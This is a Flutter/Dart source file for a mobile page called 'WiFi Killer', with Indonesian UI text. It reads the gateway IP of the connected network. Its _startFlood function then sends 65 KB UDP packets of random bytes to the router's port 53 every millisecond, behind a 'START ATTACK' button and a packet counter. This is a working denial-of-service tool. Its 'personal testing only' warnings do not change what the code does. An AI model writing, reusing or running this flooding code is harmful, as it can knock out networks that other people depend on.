import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

// ─── GLOBAL FONT ───────────────────────────────────────────────────────
const String kFont = 'Pek';

// ─── Palette Merah Glass ───────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF0A0A0F);
  static const surface   = Color(0x1AFFFFFF);
  static const card      = Color(0x0DFFFFFF);
  static const border    = Color(0x1AFFFFFF);
  static const borderLit = Color(0x33FFFFFF);

  static const primary   = Color(0xFFFF1744);
  static const primaryMid = Color(0xFFFF5252);
  static const primaryLt  = Color(0xFFFF8A80);
  static const primaryDk  = Color(0xFFB71C1C);

  static const success   = Color(0xFF00E676);
  static const amber     = Color(0xFFFFB300);
  static const red       = Color(0xFFFF1744);

  static const text      = Color(0xFFF5EEEE);
  static const textSub   = Color(0xFFE0AAAA);
  static const textDim   = Color(0xFF994444);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [Color(0xFFFF1744), Color(0xFFB71C1C)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static LinearGradient get glassGrad => LinearGradient(
    colors: [
      Colors.white.withOpacity(0.06),
      Colors.white.withOpacity(0.02),
    ],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  static List<BoxShadow> get softShadow => [
    BoxShadow(
      color: Colors.black.withOpacity(0.15),
      blurRadius: 16,
      offset: const Offset(0, 4),
    ),
  ];
}

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;
  int _packetCount = 0;
  Timer? _statsTimer;

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  @override
  void dispose() {
    _loopTimer?.cancel();
    _statsTimer?.cancel();
    isKilling = false;
    super.dispose();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied",
          "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() {
      isKilling = true;
      _packetCount = 0;
    });
    _showAlert("✅ Started", "WiFi Killer aktif!\nTap STOP untuk menghentikan.");

    const targetPort = 53;
    final List<int> payload =
        List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
            if (mounted) _packetCount++;
          }
          socket.close();
        }
      } catch (_) {}
    });

    // Update UI stats tiap 500ms
    _statsTimer = Timer.periodic(const Duration(milliseconds: 500), (_) {
      if (mounted) setState(() {});
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _statsTimer?.cancel();
    _statsTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
            child: Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                gradient: _C.glassGrad,
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: _C.border),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.wifi_tethering_rounded,
                      color: _C.primaryLt, size: 40),
                  const SizedBox(height: 12),
                  Text(title,
                      style: TextStyle(
                          color: _C.text,
                          fontFamily: kFont,
                          fontSize: 16,
                          fontWeight: FontWeight.bold)),
                  const SizedBox(height: 8),
                  Text(message,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                          color: _C.textSub,
                          fontFamily: kFont,
                          fontSize: 13,
                          height: 1.5)),
                  const SizedBox(height: 20),
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 32, vertical: 12),
                      decoration: BoxDecoration(
                        gradient: _C.btnGrad,
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Text("OK",
                          style: TextStyle(
                              color: _C.text,
                              fontFamily: kFont,
                              fontWeight: FontWeight.bold)),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── INFO ROW ───────────────────────────────────────────────────────
  Widget _infoRow(IconData icon, String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Row(
        children: [
          Container(
            width: 32,
            height: 32,
            decoration: BoxDecoration(
              color: _C.primary.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _C.primary.withOpacity(0.2)),
            ),
            child: Icon(icon, color: _C.primaryLt, size: 14),
          ),
          const SizedBox(width: 12),
          Text("$label",
              style: TextStyle(
                  color: _C.textSub,
                  fontFamily: kFont,
                  fontSize: 12,
                  fontWeight: FontWeight.w600)),
          const Spacer(),
          Expanded(
            flex: 2,
            child: Text(
              value,
              style: TextStyle(
                  color: _C.text,
                  fontFamily: kFont,
                  fontSize: 13,
                  fontWeight: FontWeight.w500),
              textAlign: TextAlign.right,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        leading: Padding(
          padding: const EdgeInsets.all(8),
          child: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              decoration: BoxDecoration(
                color: _C.surface,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: _C.border),
              ),
              child: Icon(Icons.arrow_back_ios_new_rounded,
                  color: _C.textSub, size: 16),
            ),
          ),
        ),
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _C.primary,
                boxShadow: [
                  BoxShadow(
                      color: _C.primary.withOpacity(0.6), blurRadius: 8)
                ],
              ),
            ),
            const SizedBox(width: 10),
            Text(
              'WiFi Killer',
              style: TextStyle(
                fontFamily: kFont,
                fontWeight: FontWeight.bold,
                color: _C.text,
                letterSpacing: 1.5,
                fontSize: 16,
                shadows: [
                  Shadow(
                      color: _C.primary.withOpacity(0.3), blurRadius: 10),
                ],
              ),
            ),
          ],
        ),
      ),
      body: Stack(
        children: [
          // ✅ BACKGROUND FOTO mmk.jpg
          Positioned.fill(
            child: Image.asset(
              'assets/images/mmk.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(color: _C.bg),
            ),
          ),

          // ✅ Overlay gelap
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    _C.bg.withOpacity(0.78),
                    _C.bg.withOpacity(0.88),
                    _C.bg.withOpacity(0.95),
                  ],
                ),
              ),
            ),
          ),

          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // ─── HEADER ───────────────────────────────────
                  Text(
                    "Network Analysis",
                    style: TextStyle(
                      color: _C.text,
                      fontSize: 22,
                      fontWeight: FontWeight.bold,
                      fontFamily: kFont,
                      letterSpacing: 1,
                      shadows: [
                        Shadow(
                            color: _C.primary.withOpacity(0.3),
                            blurRadius: 10),
                      ],
                    ),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Fitur ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi.",
                    style: TextStyle(
                        color: _C.textSub,
                        fontFamily: kFont,
                        fontSize: 13,
                        height: 1.5),
                  ),
                  const SizedBox(height: 20),

                  // ─── INFO CARD ────────────────────────────────
                  ClipRRect(
                    borderRadius: BorderRadius.circular(16),
                    child: BackdropFilter(
                      filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                      child: Container(
                        padding: const EdgeInsets.all(18),
                        decoration: BoxDecoration(
                          gradient: _C.glassGrad,
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: _C.border),
                          boxShadow: _C.softShadow,
                        ),
                        child: Column(
                          children: [
                            _infoRow(Icons.wifi_rounded, "SSID", ssid),
                            Divider(color: _C.border, height: 1),
                            _infoRow(Icons.language_rounded, "IP Address", ip),
                            Divider(color: _C.border, height: 1),
                            _infoRow(Icons.router_rounded, "Router IP", routerIp),
                            Divider(color: _C.border, height: 1),
                            _infoRow(Icons.speed_rounded, "Frequency",
                                "$frequency MHz"),
                          ],
                        ),
                      ),
                    ),
                  ),

                  const SizedBox(height: 28),

                  // ─── STATS CARD (hanya saat aktif) ────────────
                  if (isKilling)
                    ClipRRect(
                      borderRadius: BorderRadius.circular(16),
                      child: BackdropFilter(
                        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                        child: Container(
                          padding: const EdgeInsets.all(16),
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [
                                _C.primary.withOpacity(0.15),
                                _C.primaryDk.withOpacity(0.05),
                              ],
                            ),
                            borderRadius: BorderRadius.circular(16),
                            border: Border.all(
                                color: _C.primary.withOpacity(0.3),
                                width: 1.5),
                          ),
                          child: Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(10),
                                decoration: BoxDecoration(
                                  color: _C.primary.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                      color: _C.primary.withOpacity(0.4)),
                                ),
                                child: Icon(Icons.flash_on_rounded,
                                    color: _C.primaryLt, size: 20),
                              ),
                              const SizedBox(width: 14),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text("PACKETS SENT",
                                        style: TextStyle(
                                            color: _C.textSub,
                                            fontFamily: kFont,
                                            fontSize: 10,
                                            letterSpacing: 1.5)),
                                    const SizedBox(height: 2),
                                    Text("$_packetCount",
                                        style: TextStyle(
                                            color: _C.primaryLt,
                                            fontFamily: kFont,
                                            fontSize: 20,
                                            fontWeight: FontWeight.bold)),
                                  ],
                                ),
                              ),
                              SizedBox(
                                width: 20,
                                height: 20,
                                child: CircularProgressIndicator(
                                  color: _C.primaryLt,
                                  strokeWidth: 2,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),

                  if (isKilling) const SizedBox(height: 20),

                  // ─── ATTACK BUTTON ────────────────────────────
                  GestureDetector(
                    onTap: isKilling ? _stopFlood : _startFlood,
                    child: Container(
                      height: 60,
                      width: double.infinity,
                      decoration: BoxDecoration(
                        gradient: isKilling
                            ? LinearGradient(
                                colors: [
                                  Colors.grey.shade800,
                                  Colors.grey.shade900,
                                ],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              )
                            : _C.btnGrad,
                        borderRadius: BorderRadius.circular(20),
                        boxShadow: isKilling
                            ? []
                            : [
                                BoxShadow(
                                    color: _C.primary.withOpacity(0.4),
                                    blurRadius: 20,
                                    offset: const Offset(0, 6)),
                              ],
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            isKilling
                                ? Icons.stop_rounded
                                : Icons.wifi_off_rounded,
                            color: _C.text,
                            size: 24,
                          ),
                          const SizedBox(width: 10),
                          Text(
                            isKilling ? "STOP ATTACK" : "START ATTACK",
                            style: TextStyle(
                              fontSize: 15,
                              letterSpacing: 1.5,
                              fontFamily: kFont,
                              color: _C.text,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),

                  const SizedBox(height: 20),

                  // ─── STATUS TEXT ─────────────────────────────
                  if (isKilling)
                    Center(
                      child: Text(
                        "Sending Packets...",
                        style: TextStyle(
                            color: _C.primaryLt,
                            fontFamily: kFont,
                            fontSize: 12,
                            letterSpacing: 1),
                      ),
                    ),

                  const SizedBox(height: 20),

                  // ─── WARNING ─────────────────────────────────
                  ClipRRect(
                    borderRadius: BorderRadius.circular(12),
                    child: BackdropFilter(
                      filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                      child: Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(
                          color: _C.primary.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(
                              color: _C.primary.withOpacity(0.2)),
                        ),
                        child: Row(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Icon(Icons.warning_amber_rounded,
                                color: _C.primary, size: 16),
                            const SizedBox(width: 10),
                            Expanded(
                              child: Text(
                                'Hanya gunakan di jaringan milik Anda sendiri. '
                                'Penyalahgunaan dapat melanggar hukum.',
                                style: TextStyle(
                                    color: _C.textSub,
                                    fontFamily: kFont,
                                    fontSize: 11,
                                    height: 1.5),
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}